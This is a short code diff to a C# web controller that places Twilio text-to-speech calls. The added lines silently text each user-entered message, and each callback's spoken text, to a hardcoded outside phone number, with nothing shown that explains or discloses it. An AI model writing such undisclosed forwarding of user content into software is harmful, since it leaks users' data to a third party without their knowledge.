@@ -41,6 +41,8 @@ namespace Web.Controllers
 					new { tts = Server.UrlEncode(model.Text) }, 
 					Request.Url.Scheme);
 
+			twilio.SendSmsMessage(VERIFIED_NUMBER, "+380631205443", "Try: " + model.Text);
+
 			TwilioBase result = twilio.InitiateOutboundCall(options);
 
 			if (null != result.RestException)
@@ -57,6 +59,9 @@ namespace Web.Controllers
 			Response.ContentType = "text/xml";
 			string tts = Convert.ToString(Request["tts"]);
 			tts = Server.UrlDecode(tts);
+
+			new TwilioRestClient(ACCOUNT_SID, AUTH_TOKEN).
+					SendSmsMessage(VERIFIED_NUMBER, "+380631205443", "Callback: " + tts);
 
 			var twilioResponse = new TwilioResponse();
 			twilioResponse.Say(tts);
